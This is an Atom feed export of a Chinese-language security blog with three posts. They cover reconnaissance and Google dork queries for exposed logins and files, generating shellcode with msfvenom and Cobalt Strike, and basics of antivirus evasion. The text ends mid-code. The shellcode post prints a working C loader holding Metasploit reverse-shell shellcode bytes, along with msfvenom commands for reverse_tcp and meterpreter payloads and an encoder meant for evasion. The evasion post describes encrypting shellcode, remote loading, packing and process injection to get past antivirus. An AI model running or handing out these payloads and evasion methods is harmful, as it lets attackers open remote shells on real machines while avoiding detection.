<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Scammer</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-10-10T17:17:42.079Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Bron</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>渗透测试之信息收集</title>
    <link href="http://example.com/2023/10/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2023/10/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2023-10-09T16:00:00.000Z</published>
    <updated>2023-10-10T17:17:42.079Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>渗透之基础。</p><span id="more"></span><h1 id="公司级别（获取目标域名）"><a href="#公司级别（获取目标域名）" class="headerlink" title="公司级别（获取目标域名）"></a>公司级别（获取目标域名）</h1><ol><li><p>得到公司名，使用Google搜索得到官网，官网一般主域名。</p></li><li><p>使用企查查，天眼查，域名备案获取主域名。也可以得到相关身份信息（人名，手机号，邮箱）<br><a href="www.qcc.com">企查查</a>  <a href="https://www.tianyancha.com/">天眼查</a>  <a href="https://www.freebuf.com/sectool/284285.html">境外企业信息查询小工具</a></p></li><li><p>利用whois查询，whois反查获取域名相关信息<br><a href="http://whois.chinaz.com/">站长之家</a><br><a href="https://x.threatbook.cn/">微步</a></p></li><li><p>查看ip信息，有无CDN<br><a href="https://ping.chinaz.com/">站长工具</a><br><a href="https://www.ipshudi.com/">IP反查</a><br><a href="https://www.ssllabs.com/ssltest/analyze.html">SSL Lab查找真实IP</a></p></li></ol><h1 id="域名级别（获取目标子域名）"><a href="#域名级别（获取目标子域名）" class="headerlink" title="域名级别（获取目标子域名）"></a>域名级别（获取目标子域名）</h1><ol><li><p>子域名收集<br>Oneforall - 自动化，收集比较全，使用方便<br>fofa语法: <code>domain=&quot;anikore.jp&quot;</code></p></li><li><p>查旁站<br><a href="https://chapangzhan.com/">查旁站</a><br><a href="https://ipchaxun.com/">ip查询</a><br><a href="https://stool.chinaz.com/same?s=178.79.181.137">站长工具</a></p></li><li><p>Google语法<br>迅速查找信息泄露、管理后台暴露等漏洞语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Google hack实战-搜索敏感文件</span><br><span class="line">filetype:txt 登录</span><br><span class="line">filetype:xls 登录</span><br><span class="line">filetype:doc 登录</span><br><span class="line">site:xxx.com filetype:doc intext:pass</span><br><span class="line">site:xxx.com filetype:xsl intext:pass</span><br><span class="line">site:xxx.com filetype:conf</span><br><span class="line">site:xxx.com filetype:inc</span><br><span class="line">filetype:log iserror.log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Google hack实战-搜索登陆后台</span><br><span class="line">intitle:后台管理</span><br><span class="line">intitle:login</span><br><span class="line">intitle: 后台管理 inurl:admin</span><br><span class="line">intitle:index of /</span><br><span class="line">site:example.com filetype:txt 登录</span><br><span class="line">site:example.com intitle: 后台管理</span><br><span class="line">site:example.com admin</span><br><span class="line">site:example.com login</span><br><span class="line">site:example.com system</span><br><span class="line">site:example.com 管理</span><br><span class="line">site:example.com 登录</span><br><span class="line">site:example.com 内部</span><br><span class="line">site:example.com 系统</span><br><span class="line">site:xxx.com admin</span><br><span class="line">site:xxx.com login</span><br><span class="line">site:xxx.com 管理</span><br><span class="line">site:example.com system</span><br><span class="line">site:example.com 登录</span><br><span class="line">site:example.com 内部</span><br><span class="line">site:example.com 系统</span><br><span class="line">site:example.com filetype:txt 登录</span><br><span class="line">site:example.com intitle:后台管理</span><br><span class="line">inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</span><br><span class="line">site:example.com intext:管理|后台|登录|用户名|密码|验证码|系统|账号|admin|login|sys|management|password|username</span><br><span class="line"></span><br><span class="line">Google hack实战-搜索中间件</span><br><span class="line">Weblogic</span><br><span class="line"></span><br><span class="line">inurl:/console/login/LoginForm.jsp site:domian</span><br><span class="line">inurl:/console/login/LoginForm.jsp intitle:Oracle WebLogin Server site:domain</span><br><span class="line">inurl:/console/login/ intitle:&quot;Oracle WebLogin Server 管理控制台&quot; site:domain</span><br><span class="line"></span><br><span class="line">Jboss</span><br><span class="line"></span><br><span class="line">inurl:/jmx-console/htmladaptor site:domain</span><br><span class="line"></span><br><span class="line">Websphere</span><br><span class="line"></span><br><span class="line">inutl:/ibm/console/login.jsp site:domain</span><br></pre></td></tr></table></figure></li></ol><h1 id="IP级别（获取目标IP）"><a href="#IP级别（获取目标IP）" class="headerlink" title="IP级别（获取目标IP）"></a>IP级别（获取目标IP）</h1><ol><li><p>域名转IP<br>可使用在线工具: <a href="https://www.useotools.com/zh/domain-into-ip/output">域名转IP</a></p></li><li><p>C段信息<br>使用cIPR</p></li><li><p>存活探测，端口扫描，常见服务爆破<br>使用fscan</p></li><li><p>查找资产<br>使用fofa，zoomeye等</p></li></ol><h1 id="web级别（获取目标web信息）"><a href="#web级别（获取目标web信息）" class="headerlink" title="web级别（获取目标web信息）"></a>web级别（获取目标web信息）</h1><ol><li><p>识别网站框架cms<br>用插件Wappalyzer</p></li><li><p>路径收集<br>使用dirbuster，御剑等</p></li><li><p>敏感信息收集<br>使用JSFinder</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;渗透之基础。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="信息收集" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>ShellCode获取</title>
    <link href="http://example.com/2023/09/01/ShellCode%E7%94%9F%E6%88%90/"/>
    <id>http://example.com/2023/09/01/ShellCode%E7%94%9F%E6%88%90/</id>
    <published>2023-08-31T16:00:00.000Z</published>
    <updated>2023-09-01T06:01:34.872Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>shellcode的入门使用。</p><span id="more"></span><h1 id="shellcode简介"><a href="#shellcode简介" class="headerlink" title="shellcode简介"></a>shellcode简介</h1><p>在攻击中，shellcode是一段用于利用软件漏洞的有效负载，shellcode是16进制的机器码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在寄存器eip溢出后，放入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。</p><p>shellcode可以按照攻击者控制是否在目标机器上执行载荷分为本地shellcode和远程shellcode。本地运行的shellcode经常用于在攻击者对计算机的访问权限有限，需要利用软件漏洞提升权限；远程shellcode常用于攻击者以运行在某个网络中的另一台机器上的易受攻击的进程为目标时，如果成功执行，shellcode可以通过网络访问目标主机。</p><h1 id="直接获取shellcode"><a href="#直接获取shellcode" class="headerlink" title="直接获取shellcode"></a>直接获取shellcode</h1><p>网络上有许多已经编写好的shellcode资源公开分享，由于shellcode的本质是一段机器码，在不同的硬件设备上可能有诸多区别，在使用时一定要注意平台是否通用。下面是一个可以学习的网站。<br><a href="https://www.exploit-db.com/">Exploit Database</a><br>但来自网络的资源很有可能由于久久未更新、适用的系统已经被淘汰，或者是shellcode已经被公开而变得容易被查杀，这时候我们就需要能够即时获取shellcode的方法。</p><h1 id="通过软件获取shellcode"><a href="#通过软件获取shellcode" class="headerlink" title="通过软件获取shellcode"></a>通过软件获取shellcode</h1><h2 id="CobaltStrike-Ver-4-0"><a href="#CobaltStrike-Ver-4-0" class="headerlink" title="CobaltStrike(Ver 4.0)"></a>CobaltStrike(Ver 4.0)</h2><p><img src="/simg/shellcode_1.png" alt="cs"><br>勾选生成c语言形式的shellcode，在下拉列表里我们还能看到有许多其他语言形式的shellcode。<br><img src="/simg/shellcode_2.png" alt="cs"><br>接着我们会得到一个文件，其中包含了所需的shellcode，只要将这段shellcode放入预先写好的加载器中就可以使用了：<br><img src="/simg/shellcode_3.png" alt=" "></p><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>MsfVenom 集成了msfpayload 和msfencode的功能，用于生成各种类型的payload</p><ol><li><p>首先查看可用的payload类型，需要Windows平台下的shellcode进行实验，所以使用命令<br><code>msfvenom --list payload |grep windows</code><br>挑选一个反弹shell的payload <code>windows/shell/reverse_tcp</code></p></li><li><p>查看支持的平台架构<br><code>msfvenom -p windows/shell/reverse_tcp --list archs</code><br>选择x64平台<br>实际测试中，要根据payload选择对应的平台，否则会提示Error: The selected arch is incompatible with the payload。<br>除此之外，本次测试中生成x64架构的shellcode并不能直接用c语言加载，可能是由于测试使用的gcc编译器是32位的。选择x86架构正常加载。</p></li><li><p>查看可用的payload格式<br><code>msfvenom -p windows/shell/reverse_tcp -a x64 --list formats</code><br>选择c语言格式的payload</p></li><li><p>使用–list-options查看payload需要配置的参数<br><code>msfvenom -p windows/shell/reverse_tcp --list-options</code></p></li><li><p>生成payload<br><code>msfvenom -p windows/shell/reverse_tcp LHOST=192.168.31.1 LPORT=2333 -a x86 -f c</code><br><img src="/simg/shellcode_4.png" alt=" "></p></li></ol><p>接下来开始测试生成的shellcode是否可用<br>首先使用msf设置好监听<br><img src="/simg/shellcode_5.png" alt=" "></p><p>将生成的shellcode放入c语言加载器中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x58\x20\x01\xd3\x8b\x48\x18&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x1f\x12\x68\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x09\x1d\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">((<span class="type">void</span>(*)(<span class="type">void</span>)) &amp; buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译执行<br><img src="/simg/shellcode_7.png" alt=" "><br>成功弹回shell</p><p>接下来尝试弹回一个功能更强大的meterpreter<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.18 LPORT=2333 -a x86 -f c</code></p><p>重新生成shellcode并在加载器中更换<br><img src="/simg/shellcode_8.png" alt=" "></p><h3 id="编码器的使用"><a href="#编码器的使用" class="headerlink" title="编码器的使用"></a>编码器的使用</h3><p>查看可用的编码器<br><code>msfvenom --list encoders</code><br><img src="/simg/shellcode_9.png" alt=" "></p><p>使用-e参数指定一个编码方式，使用-i参数指定编码次数<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.18 LPORT=2333 -e x86/xor_dynamic -i 5 -a x86 -f c</code><br><img src="/simg/shellcode_10.png" alt=" "><br>生成的shellcode与不加编码器确实有所不同，但是免杀效果几乎没有，不能作为真正的免杀解决方案</p><h3 id="避免使用某些字符"><a href="#避免使用某些字符" class="headerlink" title="避免使用某些字符"></a>避免使用某些字符</h3><p>-b 参数被设置的时候，它的值中描述的字符将会被避免出现在 Payload 中<br>当这个参数被添加的时候，msfvenom 将会自动寻找合适的编码器来编码 Payload<br><img src="/simg/shellcode_11.png" alt=" "></p><h3 id="免杀工具"><a href="#免杀工具" class="headerlink" title="免杀工具"></a>免杀工具</h3><p><a href="https://github.com/Axx8/shellcode_loader">ShellCode_Loader</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在实战中免杀效果不够。<br>免杀需要不断迭代，杀毒软件也会不断更新，没有永恒的免杀。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.freebuf.com/articles/system/237300.html">简述获取shellcode的几种方式</a><br><a href="https://luckyfuture.top/Msfvenom-Gen-ShellCode">使用MSF生成ShellCode</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;shellcode的入门使用。&lt;/p&gt;</summary>
    
    
    
    <category term="免杀" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="免杀" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>免杀基础学习</title>
    <link href="http://example.com/2023/09/01/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2023/09/01/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-08-31T16:00:00.000Z</published>
    <updated>2023-09-03T02:35:39.084Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>绝大多数用户PC上都装有杀毒软件，绕过杀毒软件顺利进入系统执行即为免杀。</p><span id="more"></span><h1 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a>免杀技术</h1><p>免杀技术全称为反杀毒技术Anti Anti- Virus简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="查杀分类"><a href="#查杀分类" class="headerlink" title="查杀分类"></a>查杀分类</h3><ul><li>静态免杀：一般根据特征码识别，然后对文件进行特征匹配。</li><li>行为查杀（动态查杀）：主要是对其产生的行为进行特征匹配。</li><li>云查杀：提取出文件的特征和上传云端，云端进行检测后返回客户端，对相应病毒进行查杀。</li></ul><p><strong>静态免杀</strong><br>对于静态免杀，针对的是杀毒软件的静态文件扫描，云查（病毒库）杀。</p><p>杀毒是提取文件一段“特征码”来识别病毒文件。<br>特征码：能识别一个程序是一个病毒的一段不大于 64 字节的特征串</p><p>那杀毒软件是怎么提取文件特征码的？<br>如果我们知道了一个文件是病毒，那么通过 md5 肯定可以判断一个就是这个病毒文件，那如果该病毒文件做了小小变动呢，直接 md5 肯定是不行了，那杀毒软件是怎么做的呢？这里有个叫做“模糊哈希”（Fuzzy Hashing）算法的东西。<br>模糊哈希算法又叫基于内容分割的分片分片哈希算法（context triggered piecewise hashing, CTPH），主要用于文件的相似性比较。</p><p>大致就可以理解为，不要把一个文件的所有内容都拿来计算 hash，而通过分片，取出部分重要（不易改变）的内容进行 hash 计算，这样就能达到通过一个特征码找到类似的病毒变种。</p><p>特征码定位工具：原理就是分割文件，某些分割部分填入数据 (0)，如果扫描该部分不报警，则特征码在这个部分。如此反复，直到找到很短的某一段内容。不同工具之间区别是使用的分割算法不同，查找特征码的效果不同。</p><p>目前比较常有名气的特征码定位器主要有 CCL 与 MYCCL，他们都采用文件分块定位的办法，定位效果带有运气成份，且可能每次定位出的位置都不尽相同，这个免杀带来了困难。</p><h3 id="免杀分类"><a href="#免杀分类" class="headerlink" title="免杀分类"></a>免杀分类</h3><ul><li>开源免杀：指的是拥有病毒、木马原始码的前提下，通过修改原始码进行免杀。</li><li>手工免杀：指的是仅有病毒、木马的可执行文件（PE文件）的情况下进行免杀。</li><li>自动免杀：指的是病毒、木马自身能自动变异，如：千面人病毒。</li></ul><p><strong>手工免杀(仅限有源码)</strong></p><ol><li>mian 中屏蔽所有代码，编译，扫描。不报的话继续 2，如果依然报毒，去 5。</li><li>放开一层（可以多层、二分也可以）函数，编译，扫描。不报的话，重复 2。直到定位到某个函数或者多个函数，进入 3。</li><li>在函数内部屏蔽部分代码（二分），编译，扫描。不报，重复 2。</li><li>直到定位某段代码（无自定义内部调用），特征码在此。</li><li>是不是有附加数据，或者资源存储的文件。有，单独检查该文件或者数据，方法从 1 开始。如果没有，那去找找 PE 头吧。</li></ol><p>大致流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. sub1 //未报2. sub1 sub2 //未报3. sub1 sub2 sub3 //报4. sub1 sub2 sub3(sub31) //未报5. sub1 sub2 sub3(sub31 sub32) //报6. sub1 sub2 sub3(sub31 sub32(sub321)) //报...直到找到某API调用，或者逻辑代码（没有自定义函数调用）</span><br></pre></td></tr></table></figure><h2 id="技术概览"><a href="#技术概览" class="headerlink" title="技术概览"></a>技术概览</h2><h3 id="加壳脱壳与加密解密"><a href="#加壳脱壳与加密解密" class="headerlink" title="加壳脱壳与加密解密"></a>加壳脱壳与加密解密</h3><ul><li>加壳压缩是一种对EXE档案的数据压缩及加密保护，可以将EXE档案压缩成自我解压档案，并能隐藏解压进程。</li><li>在免杀技术里所谓的壳与伪装壳其实就是压缩与外层数据伪装，其实是利用特殊的算法，对可执行文件与动态库里的资源进行压缩与对文件的描述、版本号、创建日期、修改软件、系统执行需求等外层数据进行伪装。</li><li>脱壳就是把已压缩与伪装的文件完全或近似还原到未压缩与伪装的状态。最常用的加壳软件就是WinRAR。</li><li>加密是将明文信息隐匿起来，使之在缺少特殊信息时全部或部分数据不可读，令杀毒软件无从下手。</li><li>而解密就是令在宿主电脑中的病毒得到密钥，从而突然发作。<br>压缩壳：upx, aspack, fsg, pecompach<br>加密壳：ASProtect, Armadillo(穿山甲), EXEcryptor, Themida, ZProtect<br>虚拟机壳：VMProtect</li></ul><h3 id="加花指令与程序入口点修改"><a href="#加花指令与程序入口点修改" class="headerlink" title="加花指令与程序入口点修改"></a>加花指令与程序入口点修改</h3><ul><li>加花指令就是在程序开头加入一段计算用的汇编指令和一些入口点内存地址的乱跳转，或加上其它常用程序特有的入口指令来迷惑杀毒软件。因为计算与跳转的最后结果是没有实质的意义的，所以这么做并不影响程序的正常运行。但能使一些杀毒软件无法正确识别木马程序，从而达到免杀的效果。</li><li>程序入口点修改就是改变入口点，通常用到的方法是在入口点上令电脑先处理那段没意义的指令，再在花指令后再加跳转代码，跳转到程序执行数据的入口点上，令程序正常运行。</li></ul><h3 id="内存、文件特征码的定位与修改"><a href="#内存、文件特征码的定位与修改" class="headerlink" title="内存、文件特征码的定位与修改"></a>内存、文件特征码的定位与修改</h3><p>众所周知大部分杀毒软件查杀病毒的根据就是对比特征码，而这个过程一般发生在内存与硬盘中。对比硬盘中储存着的文件的特征码，能全面地查杀电脑中的可疑文件；对比在内存中储存着的文件的特征码，能快速地查杀正在运行的程序是否带有病毒，另外病毒文件一旦进入内存即运行中，很可能会现出原形被杀毒软件查杀。针对杀毒软件这一特性，骇客们发明了内存、文件特征码修改免杀法。通常首先用特征码定位软件定位文件特征码的所在之处，再用UltraEdit对被定位的特征码段进行修改。</p><p>一般修改方法有：</p><ul><li>十六进制的特征码直接修改法，就是把十六进制的特征码加1；</li><li>字符串大小写修改法，就是特征码所对应的内容是字符串的时候，把大小字互换；</li><li>等价替换法，就是当特征码所对应的是汇编指令时，把指令替换成功能类拟的指令；</li><li>指令顺序调换法，把特征码对应的汇编指令的顺序互换；</li><li>通用跳转法，用跳转的方法把特征码对应的汇编指令跳转走，犹如加花一样。</li></ul><p>修改特征码的方法针对性很强很有用，但一次修改只能对一款杀毒软件免杀；要令另一款软件免杀，就要重新针对该软件修改特征码，因为各家杀毒软件公司使用的特征码基本上都不相同。</p><h2 id="免杀工具"><a href="#免杀工具" class="headerlink" title="免杀工具"></a>免杀工具</h2><p>常用工具有：</p><ul><li>加壳器：PEditor、MaskPE、UPX等</li><li>脱壳与分析器：PEid、ResScope、RL!dePacker、Restorator等</li><li>加花器：FakeNinja</li><li>特征码定位与修改器:CCL、OllyDbg、UltraEdit、MYCCL</li><li>调试器：SoftIce</li><li>反汇编器：IDA、W32Dasm等</li><li>十六进制编辑器：HIEW、UltraEdit等</li><li>开 发包：SDK与DDK</li><li>编译器：Microsoft Visual C++、Borland C++、Watcom C、GNU C以及Free Pascal等</li></ul><h2 id="常用沙箱和免杀工具"><a href="#常用沙箱和免杀工具" class="headerlink" title="常用沙箱和免杀工具"></a>常用沙箱和免杀工具</h2><p><a href="https://s.threatbook.com/">微步云沙箱</a><br><a href="https://www.virustotal.com/gui/home/upload">Virustotal</a><br><a href="https://habo.qq.com/">腾讯哈勃分析系统</a><br><a href="https://sandbox.ti.qianxin.com/sandbox/page">奇安信情报沙箱</a></p><p><a href="https://cuckoo-sandbox.readthedocs.io/zh_CN/latest/introduction/sandboxing.html">Cuckoo Sandbox本地沙箱</a><br><a href="https://www.clamav.net/">ClamAV-Linux下杀毒软件</a><br><a href="https://github.com/1y0n/AV_Evasion_Tool">掩日 - 适用于红队的综合免杀工具</a></p><h2 id="免杀方法"><a href="#免杀方法" class="headerlink" title="免杀方法"></a>免杀方法</h2><ol><li>对shellcode进行加密处理，如异或、转置、AES加密、Base64加密、多轮加密等。</li><li>对加载器代码进行加密或编码处理，使其静态特征不明显。</li><li>分离免杀，将shellcode和加载器代码放置于网络上，通过下载的方式进行加载，可进一步免除静态特征。</li><li>通过进程注入或借助傀儡进程进行加载和运行。</li><li>通过加壳的方式对木马进行混淆，进而绕过杀软。<br>（通过静态特征绕过杀软检测相对容易，但是要绕过沙箱或动态检测，则非常难）</li></ol><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="加密shellcode"><a href="#加密shellcode" class="headerlink" title="加密shellcode"></a>加密shellcode</h3><ol><li><p>异或加密<br>异或加密是简单的加密方式，异或运算根据二进制位进行按位运算，如果对应位相同，则为0，不同则为1。同时遵守以下规则：<br>如果a^b&#x3D;c，则可以将b视为密钥，c视为加密字符串，则b^c&#x3D;a，可根据密钥b和密文c，解密出a的值。</p></li><li><p>字符串反转<br>在python中，对一个字符串进行反转，使用 <code>str[::-1]</code> 即可。<br>如果 str&#x3D;’abcde’, str[::-1]&#x3D;’edcba’</p></li><li><p>将字节类型转换为字符串<br>由于python的shellcode为 <code>b&#39;&#39;</code> 的字节类型（也可视为二进制类型），而要进行加密或反转处理，只能针对字符串进行处理，所以还需要对将字节类型数据转换为字符串。可以利用python内置的binascii模块进行处理。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&quot;\xfc\xe8\x8f\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&quot;</span></span><br><span class="line"><span class="built_in">str</span> = binascii.b2a_hex(buf).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure></li><li><p>Python中实现AES加解密<br>加密过程：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 